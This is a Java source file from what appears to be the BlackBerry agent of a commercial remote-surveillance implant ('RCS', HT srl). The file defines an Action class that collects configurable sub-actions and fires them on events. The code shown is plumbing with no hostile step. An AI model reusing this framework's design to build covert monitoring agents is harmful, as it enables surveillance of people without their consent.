//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry_lib
 * 
 * File         : Action.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.action;

import java.util.Vector;

import blackberry.Managed;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.event.Event;
import blackberry.utils.BlockingQueueTrigger;
import blackberry.utils.Check;


/**
 * The Class Action.
 */
public class Action implements Managed {

    /** The debug instance. */
    //#ifdef DEBUG
    protected static Debug debug = new Debug("Action", DebugLevel.VERBOSE);
    //#endif

    /** The Constant ACTION_UNINIT. */
    public static final int ACTION_UNINIT = -2;

    /** The Constant ACTION_NULL. */
    public static final int ACTION_NULL = -1;

    /** The triggered. */
    BlockingQueueTrigger triggerQueue;

    /** The sub action list. */
    private Vector subActionList = null;

    /** The Action id. */
    public int actionId = -1;

   // Event triggeringEvent;

    Status status;

    /**
     * Instantiates a new action.
     * 
     * @param actionId_
     *            the action id_
     */
    public Action(final int actionId_) {
        actionId = actionId_;
        subActionList = new Vector();
        status = Status.getInstance();
    }

    public String getId() {
        // TODO Auto-generated method stub
        return null;
    }

    /**
     * Adds the new sub action.
     * 
     * @param actionSync
     *            the action sync
     * @param confParams
     *            the conf params
     */
    public final void addNewSubAction(final int actionSync,
            final byte[] confParams) {
        final SubAction subAction = SubAction.factory(actionSync, confParams);
        //#ifdef DBC
        Check.asserts(subAction != null, "addNewSubAction: subAction != null");
        //#endif
        addSubAction(subAction);

        //#ifdef DEBUG        
        debug.info("Action " + actionId + ": " + subAction);
        //#endif
    }

    /**
     * Adds the sub action.
     * 
     * @param subAction
     *            the sub action
     */
    private synchronized void addSubAction(final SubAction subAction) {
        //#ifdef DBC
        Check.requires(subActionList != null,
                "addSubAction: subActionList!=null");
        //#endif
        subActionList.addElement(subAction);
    }

    /**
     * Gets the sub actions list.
     * 
     * @return the vector
     */
    public final Vector getSubActionsList() {
        return subActionList;
    }

   
    //#ifdef DEBUG
    public final String toString() {
        return this.getClass().getName() + " id: " + actionId + " sa:"
                + subActionList.size();
    }
    //#endif

    public void trigger(Event event) {
        // TODO Auto-generated method stub
        
    }

    public void unTrigger() {
        // TODO Auto-generated method stub
        
    }


}
